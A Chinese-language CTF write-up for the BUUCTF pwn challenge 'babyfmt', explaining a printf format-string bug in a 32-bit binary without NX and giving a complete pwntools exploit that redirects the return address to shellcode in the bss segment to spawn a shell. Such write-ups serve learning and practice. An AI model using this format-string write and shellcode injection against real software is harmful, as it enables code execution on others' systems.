# babyfmt

## 来源
Buu pwn


## 难度

2 / 10

## 保护

 ```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
 ```

## 简单描述

循环输入, 与打印, 输入quit退出, bss段可执行

## vul

```c
int vuln()
{
  int result; // eax

  while ( 1 )
  {
    read(0, buf, 0xC8u);
    result = strncmp(buf, "quit", 4u);
    if ( !result )
      break;
    printf(buf); //字符串漏洞
  }
  return result;
}
```



## 知识点

非堆栈上的字符串漏洞

## 思路

利用ebp的中的值间接修改ret地址为bss中的buf + 8, 向 buf + 8处写入shellcode, 退出即可运行shellcode, 打通几率为1 / 16



## exp

```python
#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'babyfmt'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 0

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------


#--------------------------Exploit--------------------------
def exploit():

	p = '%{}c%{}$hhn'.format(0xec, 6)
	s(p)
	io.recv()

	# modify ret to buf + 8 
	p = '%{}c%{}$hnok'.format(0xA060 + 8, 10)
	s(p)

	ru('ok')

	p = '%{}c%{}$hhn'.format(0xe8, 6)
	s(p)

	p = '\x00' * 8 
	p += asm(shellcraft.sh())
	s(p)

	p = 'quit\x00'
	sl(p)

	
def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

```

